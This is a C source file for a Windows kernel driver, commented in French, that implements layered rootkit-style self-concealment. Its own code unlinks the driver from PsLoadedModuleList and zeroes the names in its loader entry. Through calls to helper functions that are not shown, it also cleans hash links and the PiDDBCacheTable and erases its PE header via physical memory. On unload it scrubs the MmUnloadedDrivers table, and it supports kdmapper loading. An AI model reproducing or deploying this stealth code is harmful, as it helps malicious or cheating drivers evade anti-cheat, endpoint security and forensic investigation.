#include "driver.h"
#include "stealth.h"

static PLDR_DATA_TABLE_ENTRY g_ModuleEntry = NULL;
static PLIST_ENTRY           g_SavedBlink  = NULL;
static BOOLEAN               g_MapperMode  = FALSE;
static PVOID                 g_ImageBase   = NULL;
static ULONG                 g_ImageSize   = 0;

// ---------------------------------------------------------------------------
// FindSelfBase — localise la base PE de notre propre driver
//
// Scan vers le bas depuis DriverEntry, page par page, à la recherche
// de la signature MZ + PE valide. Fonctionne en mode sc et en mode mapper.
// ---------------------------------------------------------------------------
PVOID FindSelfBase(VOID)
{
    ULONG_PTR addr = (ULONG_PTR)DriverEntry & ~(PAGE_SIZE - 1ULL);

    for (ULONG i = 0; i < 0x200; i++, addr -= PAGE_SIZE) {
        __try {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)addr;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
            if (dos->e_lfanew <= 0 || dos->e_lfanew >= 0x400) continue;

            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(addr + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE)
                return (PVOID)addr;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
    }
    return NULL;
}

// ---------------------------------------------------------------------------
// HideFromLoadedList — couche 1 : retrait de PsLoadedModuleList
// ---------------------------------------------------------------------------
VOID HideFromLoadedList(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    g_ModuleEntry = entry;
    g_SavedBlink  = entry->InLoadOrderLinks.Blink;

    RemoveEntryList(&entry->InLoadOrderLinks);
    InitializeListHead(&entry->InLoadOrderLinks);
}

// ---------------------------------------------------------------------------
// ObfuscateLdrEntry — couche 2 : effacement des noms dans LDR
// ---------------------------------------------------------------------------
VOID ObfuscateLdrEntry(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    if (entry->FullDllName.Buffer && entry->FullDllName.Length > 0) {
        RtlSecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
        entry->FullDllName.Length        = 0;
        entry->FullDllName.MaximumLength = 0;
        entry->FullDllName.Buffer        = NULL;   // fix : pointeur nullifié
    }
    if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
        RtlSecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
        entry->BaseDllName.Length        = 0;
        entry->BaseDllName.MaximumLength = 0;
        entry->BaseDllName.Buffer        = NULL;   // fix : pointeur nullifié
    }
}

// ---------------------------------------------------------------------------
// CleanMmUnloadedDrivers — couche 3 (appelée au déchargement)
// ---------------------------------------------------------------------------
VOID CleanMmUnloadedDrivers(PVOID ImageBase, ULONG ImageSize)
{
    UNICODE_STRING n1 = RTL_CONSTANT_STRING(L"MmUnloadedDrivers");
    UNICODE_STRING n2 = RTL_CONSTANT_STRING(L"MmLastUnloadedDriver");

    PMM_UNLOADED_DRIVER pTable = (PMM_UNLOADED_DRIVER)MmGetSystemRoutineAddress(&n1);
    PULONG              pLast  = (PULONG)MmGetSystemRoutineAddress(&n2);
    if (!pTable || !pLast) return;

    PVOID imageEnd = (PVOID)((ULONG_PTR)ImageBase + ImageSize);
    for (ULONG i = 0; i < MM_UNLOADED_DRIVERS_SIZE; i++) {
        if (pTable[i].ModuleStart >= ImageBase &&
            pTable[i].ModuleStart <  imageEnd) {
            if (pTable[i].Name.Buffer) {
                RtlSecureZeroMemory(pTable[i].Name.Buffer, pTable[i].Name.Length);
                pTable[i].Name.Length = pTable[i].Name.MaximumLength = 0;
                pTable[i].Name.Buffer = NULL;
            }
            pTable[i].ModuleStart = pTable[i].ModuleEnd = NULL;
            pTable[i].UnloadTime  = 0;
        }
    }
}

// ---------------------------------------------------------------------------
// RestoreSelf — ré-insertion avant déchargement (évite BSOD en mode sc)
// ---------------------------------------------------------------------------
VOID RestoreSelf(VOID)
{
    if (!g_ModuleEntry || !g_SavedBlink) return;

    g_ModuleEntry->InLoadOrderLinks.Flink = g_SavedBlink->Flink;
    g_ModuleEntry->InLoadOrderLinks.Blink = g_SavedBlink;
    g_SavedBlink->Flink->Blink = &g_ModuleEntry->InLoadOrderLinks;
    g_SavedBlink->Flink        = &g_ModuleEntry->InLoadOrderLinks;
    g_ModuleEntry = NULL;
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    if (!g_MapperMode) {
        CleanMmUnloadedDrivers(DriverObject->DriverStart, DriverObject->DriverSize);
        RestoreSelf();
    }
}

// ---------------------------------------------------------------------------
// DriverEntry
//
// Ordre des opérations critique :
//   1. FindSelfBase        — avant tout (nécessaire pour couches 1c et 4)
//   2. HideFromLoadedList  — couche 1a
//   3. CleanHashLinks      — couche 1b
//   4. CleanPiDDBCache     — couche 1c (LIT le PE header — doit précéder 4)
//   5. ObfuscateLdrEntry   — couche 2
//   6. ZeroLdrFields       — couche 2b
//   7. ErasePeHeaderPhys   — couche 4 (EN DERNIER — détruit le PE header)
//
// Mode kdmapper : DriverObject = NULL. Les couches 1a/1b/1c sont inutiles
// car kdmapper ne touche jamais PsLoadedModuleList ni PiDDBCacheTable.
// Seule la couche 4 est nécessaire.
// ---------------------------------------------------------------------------
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    g_ImageBase = FindSelfBase();

    if (DriverObject && DriverObject->DriverSection) {
        g_MapperMode = FALSE;
        g_ImageSize  = DriverObject->DriverSize;
        DriverObject->DriverUnload = DriverUnload;

        // Couche 1a
        HideFromLoadedList(DriverObject);

        // Couche 1b : hash table LDR
        CleanHashLinks((PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection);

        // Couche 1c : PiDDBCacheTable (doit précéder ErasePeHeader)
        if (g_ImageBase)
            CleanPiDDBCache(g_ImageBase);

        // Couche 2 : effacement noms + champs LDR
        ObfuscateLdrEntry(DriverObject);
        ZeroLdrFields((PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection);

    } else {
        g_MapperMode = TRUE;
        // kdmapper : pas de traces dans les listes noyau — couche 4 suffit
    }

    // Couche 4 EN DERNIER — efface le PE header via adresse physique
    if (g_ImageBase)
        ErasePeHeaderPhys(g_ImageBase);

    return STATUS_SUCCESS;
}
